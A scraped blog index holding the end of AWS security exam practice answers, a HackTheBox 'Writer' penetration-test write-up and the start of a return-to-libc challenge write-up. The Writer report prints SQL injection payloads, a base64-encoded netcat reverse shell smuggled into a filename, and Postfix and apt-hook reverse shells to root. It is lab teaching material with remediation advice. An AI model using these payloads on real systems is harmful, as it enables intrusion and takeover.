them to use the CMKKey policy14  Your IAM administrator has created 20 IAM users within your organization s production AWS account  All users must be able to access AWS resources using the AWS Management Console  in addition to programmatic access via the AWS CLI  Which steps must be implemented to allow both methods of access   Choose twoCreate a user account with their own IAM credentials and password    Create an access key and secret access key for every user16  Microsoft Active Directory Federation Services  ADFS  can be used as an Identity Provider  IdP  to enable federated access to the AWS Management Console  As part of the authentication process  which API is used to request temporary credentials to enable accessAssumeRoleWithSAML17  When configuring your IdP from within IAM  which document do you need to provide that includes the issuer s name  expiration information  and keys that can be used to validate the SAML authentication response  assertions  that are received from the IdPMetadata document18  Your CTO has asked you to find a simple and secure way to perform administrative tasks and configurational changes remotely against a selection of EC2 instances within your production environment  Which option should you chooseUse the Run command in AWS Systems Manager19  Your organization is running a global retail e commerce website in which customers from around the world search your website  adding products to their shopping cart before ordering and paying for the items  During a meeting to redesign the infrastructure  you have been instructed to define a solution where routing APIs to microservices can be managed  in addition to adding security features so that users can manage authentication and access control and monitor all requests that are made from concurrent API calls  Which service should you implement to manage these requirementsAWS API Gateway21  One of your instances within a private subnet of your production network may have been compromised  Since you work within the incident team  you have been asked to isolate the instance from other resources immediately  without affecting other production EC2 instances in the same subnet  Which approaches should be followed in this situation   Choose tworemove any role associated with the EC2 instance   change security group of instance to restricted security group  thereby preventing any access to or from the instance22  You have implemented a VPN connection between your data center and your AWS VPC  You then enabled route propagation to ensure that all the other routes to networks represented across your site to site VPN connection are automatically added within your route table  However  you notice that you now have overlapping CIDR blocks between your propagated routes and existing static routes  Which statement is trueYour static routes will take precedence over propagated routes23  Your CTO has explained that they are looking for a solution to be able to monitor network packets across your VPC  You suggest VPC flow logs  but the CTO wants to implement a solution whereby captured traffic is sent to a Network Load Balancer  using UDP as a listener  which sits in front of a fleet of appliances dedicated to network analysis  What solution would you suggest to the CTOUse Traffic Mirroring to capture packets and use the NLB as a Target24  You have been tasked with defining a central repository that enables you to view real time logging information from different AWS services that can be filtered and queried to search for specific events or error codes  Which of the following would you useAmazon CloudWatch logs25  Which feature of AWS CloudTrail can be used for forensic investigation to confirm that your log files have not been tampered withSelect Log File Validation31  When encrypting an EBS group  which kind of keys can be used   Choose threeAWS managed CMK key   AWS owned CMK key   Customer CMK key34  Which policies do NOT require a principal parameter within the context of the policy   Choose twoAn inline IAM policy   A service control policy  SCP35  You have just joined a new startup as a security engineer  One of your first tasks is to implement authentication for a new mobile application that is likely to scale to over a million users within the first few months  Which option is the best for handling scaling with minimal managementImplement Amazon Cognito with Social Federation36  Your engineering team has come to you to explain that they have lost the private key associated with one of their Linux instance stored backed root volume EC2 instances  and they can no longer connect to and access the instance  Which statement is true in this circumstanceWhen you lose your private key to an EC2 instance that has an instance stored root volume  there is no way to reestablish connectivity to the instance37  You are explaining the differences between security groups and Network Access Control Lists to a customer  What key points are important to understand when understanding how these two security controls differ from each other   Choose threeSecurity groups are stateful by design and NACLs are not   Securiyt groups controll access at the instance level   NACLs allow you to add a  deny  action within the ruleset38  Your new startup is deploying a highly scalable multi tiered application  Your VPC is using both public and private subnets  along with an application load balancer  Your CTO has defined the following requirementsa NAT gateway should be deployed in the public subnet   Launch the EC2 instances in the private subnet39  You are experiencing an increase in the level of attacks across multiple different AWS accounts against your applications from the internet  This includes XSS and SQL injection attacks  As the security architect for your organization  you are responsible for implementing a solution to help reduce and minimize these threats  Which AWS services should you implement to help protect against these attacks   Choose twoAWS Firewall Manager   AWS Web Application Firewall40  During the deployment of a new application  you are implementing a public facing Elastic Load Balancer  ELB   Due to the exposed risk  you need to implement encryption across your ELB  so you select HTTPS as the protocol listener  During this configuration  you will need to select a certificate from a certificate authority  CA   Which CA is the recommended choice for creating the X 509 certificateAWS Certificate Manager41  Recently  you have noticed an increase in the number of DDoS attacks against your public web servers  You decide to implement AWS Shield Advanced to help protect your EC2 instances  Which configurational change do you need to implement before you can protect your instance using the advanced featuresAssign an EIP to the EC2 instance42  Which layer of the OSI model do both Amazon CloudFront  with AWS WAF  and Route 53 offer attack mitigation against   Choose threeThey offer attack mitigation against layers 3 4  and 745  An engineer has raised a concern regarding one of your buckets and wants to understand details about when a particular bucket has been accessed to help ascertain the frequency and by whom  Which method would be the MOST appropriate to get the data requiredAnalyze S3 Server Access Logs46  Amazon S3 object level logging integrates with which other AWS serviceAWS CloudTrail47  You are currently monitoring the traffic flow between a number of different subnets using VPC flow logs  Currently  the configuration of the capture is capturing ALL packets  However  to refine the flow log details  you want to modify the configuration of the flow log so that it only captures rejected packets instead  Which of the following statements is trueYou can t change the configuration of an existing flow log once it s been created48  Your CTO is concerned about the sensitivity of the data being captured by AWS CloudTrail  As a result  you suggest encrypting the log files when they are sent to S3  Which encryption mechanism is available to you during the configuration of your TrailSSE KMS49  As part of your security procedures  you need to ensure that  when using the Elastic File System  EFS   you enable encryption in transit using TLS as a mount option  which uses a client tunnel process  Assuming your filesystem is fs 12345678 and your filesystem s identifier is  mnt efs  which command would you enter to mount the EFS file stems with encryption enabledsudo mount  t efs  o tls fs 12345678    mnt efs 50  You are configuring your AWS environment in preparation for downloading and installing the CloudWatch agent to offer additional monitoring  Which two tasks should you complete prior to installing the agentEnsure that your EC2 instance is running the latest version of the SSM agent     Ensure that your EC2 instances have outbound internet access51  You have been approached by your compliance team to define what data is encrypted on an EBS volume when EBS encryption has been enabled  Which of the following should you choose   Choose threethe root and data volume   All data moving between the EBS volume and the associated EC2 instance   All snapshots of the EBS volume52  You are being audited by an external auditor against PCI DSS  who is accessing your solutions that utilize AWS  You have been asked to provide evidence that certain controls are being met against infrastructure that is maintained by AWS  What is the best way to provide this evidenceUse AWS Artifact to download the appropriate compliance records53  Which part of AWS CloudHSM can carry out the following functions  Perform encryption and decryption   Create  delete  wrap  unwrap  and modify attributes of keys   Sign and verify   Generate digests and HMACs  br  Crypto User  CU56  Amazon GuardDuty uses different logs to process and analyze millions of events that are then referenced against numerous threat detection feeds  many of which contain known sources of malicious activity  including specific URLs and IP addresses  Which of the following logs are NOT used by Amazon GuardDuty   Choose twoS3 Server Access logs   CloudWatch Event logs59  You have been asked to upload the company s own key material instead of using the key material generated by KMS  In preparation for doing this  you download the public key and import token  What format must your key material be in prior to it being uploadedBinary61  Which of the following is NOT considered an asymmetric key encryption mechanismAdvanced Encryption Standard  AES62  AWS Trusted Advisor helps customers optimize their AWS environment through recommended best practices  Which of the following is NOT one of the five categories that it checks in your accountMonitoring63  Which of the following keys shows an AWS managed key when using Amazon S3 SSE KMSaws s364  Which keys used in conjunction with KMS are used outside of the KMS platform to perform encryption against your data   Data Encryption key",
      "image": "/images/aws.png"
    } ,
  
    {
      "title"    : "Writer Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/08/22/Writer-Writeup/",
      "date"     : "Aug 22, 2021",
      "content"  : "layout  posttitle   Writer Writeupdescription  This system contained an SQL injection vulnerability which could be leveraged to not only log into an application with admin privileges  but also could be used to read local files on the target  After leaking the source code of the website  an insecure usage of handling files was exploited to get RCE  With a www data shell on the system  an insecure password of a local user located in the SQL database was cracked  Eventually the system was fully compromised through misconfigurations relating to SMTP and APT date    2021 08 22 image     images 0xd4y logo gray png tags     SQLi  SMTP  RCE  APTThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Writer 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formatted images 0xd4y logo gray png LinkedIn   https   www linkedin com in segev eliezer   https   www google com url q https   www linkedin com in segev eliezer  sa D source editors ust 1653773864786089 usg AOvVaw02OXACudSej5nWLBZ4W3VkEmail   0xd4yWriteups gmail com  mailto 0xd4yWriteups gmail comWeb   https   0xd4y.com   https   www google com url q https   0xd4y.com Writeups  sa D source editors ust 1653773864786836 usg AOvVaw0 jePr Y ezgNebGNMiTPlTable of ContentsExecutive Summary   h 2gk743bl4yws          2   h 2gk743bl4ywsAttack Narrative   h fghdla5fgquk          3   h fghdla5fgqukEnumeration   h 5e17enz1cocp          3   h 5e17enz1cocpPort Enumeration   h 58c2ch507318          3   h 58c2ch507318Web Enumeration   h 6io3z78bqws5          4   h 6io3z78bqws5SQL Injection   h x293nzwjnfbk          6   h x293nzwjnfbkLeveraging SQLi to Read Local Files   h g4h70w2pg84e          9   h g4h70w2pg84eGetting RCE   h ipxz7iecqxp          10   h ipxz7iecqxpSource Code Analysis   h qinf94u9q24o          10   h qinf94u9q24oFinding RCE Vulnerability   h eswqky3qu6hx          14   h eswqky3qu6hxReverse Shell   h y2evuj3gcvwr          15   h y2evuj3gcvwrPrivilege Escalation   h liuipufirkbp          16   h liuipufirkbpKyle   h hx02jbakg0r0          16   h hx02jbakg0r0John   h jq4agn4fei2y          16   h jq4agn4fei2yRoot   h etqhj0aul7pm          17   h etqhj0aul7pmPost Exploitation Analysis   h ui1gvqou6arf          19   h ui1gvqou6arfSQLi Mitigation  PDO    h nw8pksu8e5re          19   h nw8pksu8e5reImage Upload  RCE    h 4o6awot3ot4          20   h 4o6awot3ot4Conclusion   h m32hn92j9nqq          22   h m32hn92j9nqqExecutive SummaryAfter enumerating the website  the  administrative page was found which involved a simple login page  The username field is vulnerable to a critical SQL injection  which an attacker could leverage to login as an administrative user  access sensitive local files  and extract usernames and password hashesFollowing the authentication bypass  an insecure image upload feature could be exploited to gain RCE on the target  After obtaining a shell as the www data user  escalating privileges to the local kyle user could be done by way of cracking his hash in the dev SQL database  The kyle user was part of the filter group which allowed for editing the configuration files of the SMTP service running locally on port 25  Because this service was running as the john user  getting a shell via the service resulted in compromising his accountFinally  the john user is part of the management group which has access to the apt repository configuration files  A cronjob running as root which performed a frequent apt get update command could therefore be taken advantage of  and obtaining root privileges was possible through adding a reverse shell file in the apt configurations  Please view the  Post Exploitation Analysis   h ui1gvqou6arf  and  Conclusion   h m32hn92j9nqq  sections to see remediations for these vulnerabilitiesAttack NarrativeNo information was provided prior to this engagement  other than the IP address of the target  10 10 11 101EnumerationPort EnumerationTo examine potential vulnerabilities  the ports of the target were first scannedhighlight bash   Nmap 7 91 scan initiated Tue Aug 17 14 52 04 2021 as  nmap  sC  sV  oA nmap nmap 10 10 11 101Nmap scan report for 10 10 11 101Host is up  0 065s latency  Not shown  996 closed portsPORT    STATE SERVICE     VERSION22 tcp  open  ssh         OpenSSH 8 2p1 Ubuntu 4ubuntu0 2  Ubuntu Linux  protocol 2 0   ssh hostkey     3072 98 20 b9 d0 52 1f 4e 10 3a 4a 93 7e 50 bc b8 7d  RSA     256 10 04 79 7a 29 74 db 28 f9 ff af 68 df f1 3f 34  ECDSA     256 77 c4 86 9a 9f 33 4f da 71 20 2c e1 51 10 7e 8d  ED25519 80 tcp  open  http        Apache httpd 2 4 41   Ubuntu    http server header  Apache 2 4 41  Ubuntu   http title  Story Bank   Writer HTB139 tcp open  netbios ssn Samba smbd 4 6 2445 tcp open  netbios ssn Samba smbd 4 6 2Service Info  OS  Linux  CPE  cpe  o linux linux kernelHost script results   clock skew  32s  nbstat  NetBIOS name  WRITER  NetBIOS user   unknown   NetBIOS MAC   unknown   unknown   smb2 security mode     2 02       Message signing enabled but not required  smb2 time     date  2021 08 17T19 52 51    start date  N AService detection performed  Please report any incorrect results at https   nmap org submit     Nmap done at Tue Aug 17 14 52 20 2021    1 IP address  1 host up  scanned in 15 70 seconds   endhighlightFrom the nmap scan  it is apparent that the SSH  HTTP  and SMB services are running on the target   The SMB service is of interest  however there is no anonymous access to any of the shares reports Writer image1 png Seeing as all of the services are up to date  it follows that the HTTP service must be searched for potential vulnerabilitiesWeb EnumerationUsers visiting the target s web server are met with the following home page reports Writer image4 png Enumerating the directories of the webpage with gobuster  1    ftnt1   the following directories are foundhighlight bash  contact               Status  200   Size  4905  logout                Status  302   Size  208       http   10 10 11 101   about                 Status  200   Size  3522  static                Status  301   Size  313       http   10 10 11 101 static                         Status  200   Size  11971  dashboard             Status  302   Size  208       http   10 10 11 101   server status         Status  403   Size  277  administrative        Status  200   Size  1443    endhighlightA directory of particular interest is  administrative  especially since it cannot be found without brute forcing directories  Visiting this directory reveals a simple login form which asks for a username and password reports Writer image2 png Note the domain of the target  namely writer htb   However  no virtual host routing is presentSQL InjectionWhen inputting  OR 1 1     as the username and choosing a random value for the password  the user is automatically authenticated  thus confirming the presence of SQL injection  As an authenticated user  stories can be edited and created  and pictures can be uploaded reports Writer image5 png The web page does not properly check if an uploaded file is an image  as it was possible to upload a reverse shell by the name of php reverse shell jpg php  This  however  did not lead to RCE as the web page nevertheless treated the file as an image  Furthermore  uploading a malicious image with PHP code did not workAn addition to the image upload feature is the ability to upload files given a url  This could be utilized to cause the server to perform GET requests to an arbitrary website of the user s choiceRequesthighlight bash  POST  dashboard stories add HTTP 1 1Host  10 10 11 101User Agent  Mozilla 5 0  Windows NT 10 0  rv 78 0  Gecko 20100101 Firefox 78 0Accept  text html application xhtml xml application xml q 0 9 image webp     q 0 8Accept Language  en US en q 0 5Accept Encoding  gzip  deflateContent Type  multipart form data  boundary                            12417370376638841362770592069Content Length  850Origin  http   10 10 11 101DNT  1Connection  closeReferer  http   10 10 11 101 dashboard stories addCookie  session eyJ1c2VyIjoiJ09SIDE9MS0tIC0ifQ YSLw7w 2OHVWSzrpZAobEiyfxo94ul3lfgUpgrade Insecure Requests  1Sec GPC  1                         12417370376638841362770592069   Content Disposition  form data  name  author   0xd4y                             12417370376638841362770592069Content Disposition  form data  name  titleWriteup                             12417370376638841362770592069Content Disposition  form data  name  taglineWriteup                             12417370376638841362770592069Content Disposition  form data  name  image   filenameContent Type  application octet stream                         12417370376638841362770592069   Content Disposition  form data  name  image url   http   10 10 15 80 image jpg                             12417370376638841362770592069Content Disposition  form data  name  content Thanks for reading                              12417370376638841362770592069   endhighlightNote the  image url  parameter highlighted in redResponsehighlight bash        0xd4y Writeup     business hackthebox medium linux writer       sudo nc  lvnp 80listening on  any  80    connect to  10 10 15 80  from  UNKNOWN   10 10 11 101  38018GET  image jpg HTTP 1 1Accept Encoding  identityHost  10 10 15 80User Agent  Python urllib 3 8Connection  close   endhighlightJudging from the user agent  it was found that the server is running python  After failing to obtain code executions despite trying many different upload attacks  it follows that the source code of the upload feature must be leaked to determine how it worksLeveraging SQLi to Read Local FilesThis is possible via the load file SQL function  Going back to the login page  this function can be used in conjunction with a union select statement to leak filesPayloadhighlight bash uname  union select 1 load file   etc passwd   3 4 5 6     password a   endhighlightResponsehighlight bash Welcome root x 0 0 root  root  bin bashdaemon x 1 1 daemon  usr sbin  usr sbin nologinbin x 2 2 bin  bin  usr sbin nologinsys x 3 3 sys  dev  usr sbin nologinsync x 4 65534 sync  bin  bin syncgames x 5 60 games  usr games  usr sbin nologinman x 6 12 man  var cache man  usr sbin nologinlp x 7 7 lp  var spool lpd  usr sbin nologinmail x 8 8 mail  var mail  usr sbin nologinnews x 9 9 news  var spool news  usr sbin nologinuucp x 10 10 uucp  var spool uucp  usr sbin nologinproxy x 13 13 proxy  bin  usr sbin nologinwww data x 33 33 www data  var www  usr sbin nologinbackup x 34 34 backup  var backups  usr sbin nologinlist x 38 38 Mailing List Manager  var list  usr sbin nologinirc x 39 39 ircd  var run ircd  usr sbin nologingnats x 41 41 Gnats Bug Reporting System  admin   var lib gnats  usr sbin nologinnobody x 65534 65534 nobody  nonexistent  usr sbin nologinsystemd network x 100 102 systemd Network Management     run systemd  usr sbin nologinsystemd resolve x 101 103 systemd Resolver     run systemd  usr sbin nologinsystemd timesync x 102 104 systemd Time Synchronization     run systemd  usr sbin nologinmessagebus x 103 106   nonexistent  usr sbin nologinsyslog x 104 110   home syslog  usr sbin nologin apt x 105 65534   nonexistent  usr sbin nologintss x 106 111 TPM software stack     var lib tpm  bin falseuuidd x 107 112   run uuidd  usr sbin nologintcpdump x 108 113   nonexistent  usr sbin nologinlandscape x 109 115   var lib landscape  usr sbin nologinpollinate x 110 1   var cache pollinate  bin falseusbmux x 111 46 usbmux daemon     var lib usbmux  usr sbin nologinsshd x 112 65534   run sshd  usr sbin nologinsystemd coredump x 999 999 systemd Core Dumper    usr sbin nologinkyle x 1000 1000 Kyle Travis  home kyle  bin bashlxd x 998 100   var snap lxd common lxd  bin falsepostfix x 113 118   var spool postfix  usr sbin nologinfilter x 997 997 Postfix Filters  var spool filter  bin shjohn x 1001 1001      home john  bin bashmysql x 114 120 MySQL Server     nonexistent  bin false   endhighlightGetting RCESource Code AnalysisBefore being able to read the source code of the website  the full path of the file containing the source code must first be discovered  Seeing as the server is running apache2  the 000 default conf file in the  etc apache2 sites available directory  a directory which holds configuration files for Apache virtual hosts  can be leaked to determine this informationPayloadhighlight bash uname  union select 1 load file   etc apache2 sites available 000 default conf   3 4 5 6     password a   endhighlightResponsehighlight bash Welcome   Virtual host configuration for writer htb domain lt VirtualHost   80 gt        ServerName writer htb       ServerAdmin admin writer htb       WSGIScriptAlias    var www writer htb writer wsgi        lt Directory  var www writer htb gt                Order allow deny               Allow from all        lt  Directory gt        Alias  static  var www writer htb writer static        lt Directory  var www writer htb writer static  gt                Order allow deny               Allow from all        lt  Directory gt        ErrorLog   APACHE LOG DIR  error log       LogLevel warn       CustomLog   APACHE LOG DIR  access log combined lt  VirtualHost gtVirtual host configuration for dev writer htb subdomain  Will enable configuration after completing backend development  Listen 8080  lt VirtualHost 127 0 0 1 8080 gt          ServerName dev writer htb         ServerAdmin admin writer htb          Collect static for the writer2 project writer web templates         Alias  static  var www writer2 project static          lt Directory  var www writer2 project static gt                  Require all granted          lt  Directory gt      lt Directory  var www writer2 project writerv2 gt                 lt Files wsgi py gt                        Require all granted                lt  Files gt         lt  Directory gt           WSGIDaemonProcess writer2 project python path  var www writer2 project python home  var www writer2 project writer2env       WSGIProcessGroup writer2 project       WSGIScriptAlias    var www writer2 project writerv2 wsgi py       ErrorLog   APACHE LOG DIR  error log       LogLevel warn       CustomLog   APACHE LOG DIR  access log combined  lt  VirtualHost gt   vim  syntax apache ts 4 sw 4 sts 4 sr noet   endhighlightIn particular  note the directory in which the writer wsgi file lies in  highlighted in blue   After finding out that the server is running python  fuzzing for files in the root of the web server revealed an   init   py file within  var www writer htb writer   Leaking this file reveals the following contentshighlight python if request method     POST          if request files  image                image   request files  image              if   jpg  in image filename                 path   os path join   var www writer htb writer static img    image filename                image save path                 image     img     format image filename            else                 error    File extensions must be in  jpg                 return render template  add html   error error        if request form get  image url              image url   request form get  image url             if   jpg  in image url                try                    local filename  headers   urllib request urlretrieve image url                    os system  mv       jpg  format local filename  local filename                     image       jpg  format local filename                    try                        im   Image open image                        im verify                         im close                         image   image replace   tmp                            os system  mv  tmp     var www writer htb writer static img     format image  image                         image     img     format image                    except PIL UnidentifiedImageError                        os system  rm     format image                         error    Not a valid image file    if request form get  image url            image url   request form get  image url             if   jpg  in image url                try                  local filename  headers   urllib request urlretrieve image url                    os system  mv       jpg  format local filename  local filename                     image       jpg  format local filename                    try                        im   Image open image                        im verify                         im close                       image   image replace   tmp                             os system  mv  tmp     var www writer htb writer static img     format image  image                         image     img     format image                        cursor   connector cursor                         cursor execute  UPDATE stories SET image     image s WHERE id     id s     image  image   id  id                       result   connector commit                     except PIL UnidentifiedImageError                        os system  rm     format image                         error    Not a valid image file                         return render template  edit html   error error  results results  id id              except                    error    Issue uploading picture                    return render template  edit html   error error  results results  id id            else              error    File extensions must be in  jpg      endhighlight   Note the file was shortened to better emphasize the source code of the upload feature  Critically insecure code is highlighted in red  and the text highlighted in purple is the segment that the undermentioned exploit focuses onFinding RCE VulnerabilityWithin the source code are multiple examples of insecure code  explored more in detail in the  Post Exploitation Analysis   h ui1gvqou6arf  section   One that particularly stands out is the call of os system on the uploaded filename  Before testing exploits on the target  the exploit was tested out locally to get a closer view as to how the program behaves  Copying the segment of interest  we can get a closer look at how the program treats file namesCodehighlight python import urllibimport osfrom flask import requestlocal filename  headers   urllib request urlretrieve  http   10 10 15 80  jpg 1 jpg sleep  print  The local filename is   local filename os system  mv       jpg  format local filename  local filename   endhighlightObserve the argument of the urllib request urlretrieve   function  The user is in control of this argument  If a user were to upload a file called 1 jpg sleep  then the server will behave accordinglyResponseThe local filename is  tmp tmpen3ya1q1However  when changing the argument to be file    home 0xd4y business hackthebox medium linux writer www  jpg 1 jpg sleep 10  then command execution is performed  This works because the urllib function does not correctly rename the file to something safe in the instance that the argument is using the file protocol  Therefore  a file with a malicious name can be uploaded using the image parameter  and this file can then be referenced locally via the file protocolReverse ShellAfter uploading a file with the name  0xd4y jpg echo  n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA L3RtcC9m base64  d bash   it was referenced locally by putting the following in the image url parameter  file    var www writer htb writer static img 0xd4y jpg  echo  n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA L3RtcC9m base64  d bash   A reverse shell was then returned as the www data userhighlight bash        0xd4y Writeup     business hackthebox medium linux writer       nc  lvnp 9001listening on  any  9001    connect to  10 10 15 80  from  UNKNOWN   10 10 11 101  59938 bin sh  0  can t access tty  job control turned off  whoamiwww data   endhighlightPrivilege EscalationKyleAfter enumerating multiple files in the box  it was found that there is a username and password in a mysql config file called  etc mysql my cnf that points to the dev databasedatabase   devuser   djangouserpassword   DjangoSuperPasswordOne of Kyle s passwords is located in the databases  albeit it is hashedpbkdf2 sha256 260000 wJO3ztk0fOlcbssnS1wJPD bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A   Cracking this hash reveals that Kyle s password is marcoantonioJohnThe kyle user is part of multiple groups  one of them being the filter group which has permissions to edit the  etc postfix disclaimer file  Furthermore  after enumerating the ports running locally on the target  it was found that port 25 is open and running a Postfix SMTP serverWith pspy  2    ftnt2  running on a separate kyle SSH instance  the following message was sent on the boxkyle writer    nc localhost 25220 writer htb ESMTP Postfix  Ubuntu MAIL FROM kyle writer htb250 2 1 0 OkRCPT TO  john writer htb250 2 1 5 OkData354 End data with  CR  LF   CR  LF Thanks for reading this writeup250 2 0 0 Ok  queued as 9BB6F137Upon sending this message  the following process occurred in the background2021 08 25 00 12 54 CMD  UID 1001 PID 23607     bin sh  etc postfix disclaimer  f kyle writer htb    john writer htbThus  the server is running as the john user  note UID 1001   and is executing the  etc postfix disclaimer file  Seeing as the kyle user had permission to edit this file  achieving a reverse shell as the john user could be obtained via appending a reverse shell to the top of the file and sending a message0xd4y Writeup     business hackthebox medium linux writer       nc  lvnp 9001listening on  any  9001    connect to  10 10 15 80  from  UNKNOWN   10 10 11 101  49840 bin sh  0  can t access tty  job control turned off  whoamijohnPersistence on this account was maintained by grabbing john s ssh keyRootJohn is part of the management group which has permission to edit the apt directory  etc apt apt conf d  a directory which is responsible for containing the apt configurations  As discovered using pspy  there is a cronjob running as root which performs the following command   usr bin apt get update  Therefore  a malicious configuration that returns a reverse shell can be added to the directory as followshighlight bash john writer    echo  apt  Update  Pre Invoke   rm  tmp f mkfifo  tmp f cat  tmp f  bin sh  i 2  1 nc 10 10 15 80 9001   tmp f        etc apt apt conf d 0xd4y pwn   endhighlightWhen the cronjob runs again  a reverse shell is returned as the root userhighlight bash        0xd4y Writeup     business hackthebox medium linux writer       nc  lvnp 9001listening on  any  9001    connect to  10 10 15 80  from  UNKNOWN   10 10 11 101  56068 bin sh  0  can t access tty  job control turned off  whoamiroot   endhighlightPost Exploitation AnalysisThis section goes into further detail about the vulnerabilities of the target and how to mitigate them  Note that the mitigations shown in this section are incomplete pieces of code  however they are secure implementations of the desired resultSQLi Mitigation  PDOThis machine contained multiple vulnerabilities  starting with the SQL injection in the  administrative page  The vulnerability lies in the following SQL statement that is performed on the user s queryhighlight sql  Select   From users Where username     s  And password     s      username  password    endhighlightThis insecure SQL statement allows an attacker to add a single quote in their username and then perform an arbitrary SQL statement of their choosing  To mitigate SQL injection attacks  the current recommendation is to use PDO  PHP Data Objects   The following code does not directly pass the user input into the SQL statement  Rather  using PDO tells the server what the SQL query and the user inputted data are  This is successfully performed because the instruction and user input are sent separately to the databasehighlight php   phptryconn   new PDO  mysql host  servername dbname  dbname    db username   db password      set the PDO error mode to exception  conn  setAttribute PDO  ATTR ERRMODE  PDO  ERRMODE EXCEPTION      prepare sql and bind parameters         query    INSERT INTO users  username password   VALUES  username  password            statement    conn  prepare  query           statement  execute array      username     username      password     passwordcatch PDOException  e    echo  Error       e  getMessageconn   nullendhighlightImage Upload  RCEAfter successfully performing an SQL injection attack  an upload feature in the webpage was exploited to gain RCE due to insecure python code  System commands and evaluation functions should never be performed on user input  As discussed in  Finding RCE Vulnerability   h eswqky3qu6hx   the system   function in the os module was the reason for the critical RCE vulnerability  The following code prevents this vulnerabilityhighlight python from werkzeug utils import secure filenamefrom PIL import Imagefilename   request file  imageimage   StringIO base64 b64decode download  file    allowed extensions     jpg   jpeg  if filename split       1  in allowed extensions           try                 filename   secure filename filename            img   Image open image               img verify                path   os path join   var www writer htb writer static img    filename                 image save path       except Exception                 print  Invalid image     else             print  Filename extension not allowed       endhighlight   The above program verifies if a file is a valid image by first checking its extension  Note that this is different from the source code of the website which simply searches for the presence of the  jpg string in the filename  After verifying the file s extension  PIL s verify method is called on the file before the file is uploaded to the img directoryConclusionMultiple vulnerabilities were present on the target which resulted in a full compromise of the system  The  administrative page contained an SQL injection vulnerability which resulted in the leakage of local files and authentication bypass  After authenticating to the server  the insecure handling of filenames led to an RCE vulnerabilityAfterwards  the privilege escalation to root involved logging into the system as the kyle user who had permissions to edit the mail service  Due to the service running under john  the lateral movement involved adding a reverse shell to the configuration of the service  As the john user  apt configurations could be modified to exploit an apt get update cronjob running as the root user  Observe the following remediations to mitigate the vulnerabilities outlined in the reportSecure the SQL login page on  administrativePDO should be used in place of the insecure SQL statement  see  SQLi Mitigation  PDO    h nw8pksu8e5re   Never use system   or any sort of evaluation function on user input The system command on the uploaded filename resulted in RCE Never reuse passwordsAs the www data user  kyle s password could be retrieved by cracking his hash from the dev database  This would not have been of much use if the local kyle user had a different password on the target Passwords should be secure Fix misconfigurations related to the kyle and john userkyle was able to edit a service that was run by john  To mitigate this  the service should either be run by kyle  or kyle should not have permissions to edit the service john was able to edit apt configurations  This sort of privilege should not be granted to any user  By adding a reverse shell to the apt configurations  any user who runs the apt command can be compromised by john 1    ftnt ref1   https   github com OJ gobuster  https   www google com url q https   github com OJ gobuster sa D source editors ust 1653773864860204 usg AOvVaw0G3ZxMquY9ovsHERwv9Wfu2    ftnt ref2   https   github com DominicBreuker pspy  https   www google com url q https   github com DominicBreuker pspy sa D source editors ust 1653773864860599 usg AOvVaw1i07HkYHN5cp3nF3SIrdC1",
      "image": "/images/Writer.png"
    } ,
  
    {
      "title"    : "Ret2theunknown Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/07/31/Ret2TheUnknown/",
      "date"     : "Jul 31, 2021",
      "content"  : "layout  posttitle   Ret2The Unknown Writeupdescription  This challenge was about exploiting a binary via a return to libc attack  due to the enabled NX bit   The address of printf was provided to faciliate exploitation  however it was only given after passing in user input  This address could not be used for future execution of the binary due to the presence of ASLR  Nevertheless  despite the presence of the enabled NX bit and ASLR  the binary was vulnerable date    2021 07 31image     images 0xd4y logo gray png tags     Ret2Libc  Binary Exploitation  ASLR BypassThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Ret2The Unknown 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formattedRet2The UnknownReturn to libc attack with ASLR    images 0xd4y logo gray png 0xd4yJuly 31  20210xd4y WriteupsLinkedIn   https   www linkedin com in segev eliezer   https   www google com url q https   www linkedin com in segev eliezer  sa D source editors ust 1653837169040870 usg AOvVaw3Jx2E SPxDKSSqZejdPj3dEmail   0xd4yWriteups gmail com  mailto 0xd4yWriteups gmail comWeb   https   0xd4y.com   https   www google com url q https   0xd4y.com Writeups  sa D source editors ust 1653837169042040 usg AOvVaw2zLdYrTe7NRCl4MzEU4xcTable of ContentsExecutive Summary   h 2gk743bl4yws          2   h 2gk743bl4ywsAttack Narrative   h fwo658cjlflb          3   h fwo658cjlflbBinary Analysis   h ne29o12hqmx          3   h ne29o12hqmxSource Code   h s3etgisko63w          3   h s3etgisko63wBehavior   h 5bi2ub2pw035          4   h 5bi2ub2pw035Exploit Construction   h cnchbef0ghmr          6   h cnchbef0ghmrGDB   h no9johlar4b7          6   h no9johlar4b7PwnTools   h u22xqt10ni2q          8   h u22xqt10ni2qRerunning main     h u0zf6m2396p          8   h u0zf6m2396pFinding Base Libc Address   h 7rxf70l4dide          9   h 7rxf70l4dideBuilding system   bin sh     h g09gpw7xiphg          11   h g09gpw7xiphgExploit   h f8fs3vo8tohw          11   h f8fs3vo8tohwConclusion   h susjdnco5e24          14   h susjdnco5e24Executive SummaryThe utilization of the insecure gets   function resulted in a buffer overflow vulnerability  This security hole was exploited to execute arbitrary code despite the enabled NX bit via a return to libc attack  The deprecated gets   function should be replaced with the more secure fgets   alternative to prevent the attack mentioned in this report  It is highly suggested that the process running on port 31568 be terminated as soon as possible until the remediations outlined in the  Conclusion   h susjdnco5e24  section are followedAttack NarrativeThe destination and port on which this binary is running were givenDestinationPortmc ax31568Additionally  the source code and libc file used by the binary were providedBinary AnalysisSource Codehighlight c    include  stdio h  include  string hint main void   char your reassuring and comforting we will arrive safely in libc 32setbuf stdout  NULL   setbuf stdin  NULL   setbuf stderr  NULL   puts  that board meeting was a  smashing  success  rob loved the challenge     puts  in fact  he loved it so much he sponsored me a business trip to this place called  libc        puts  where is this place  can you help me get there safely        please i cant afford the medical bills if we crash and segfault gets your reassuring and comforting we will arrive safely in libc   puts  phew  good to know  shoot  i forgot     printf  rob said i d need this to get there   llxn   printf   puts  good luckendhighlightAt the top of the file  32 bytes were 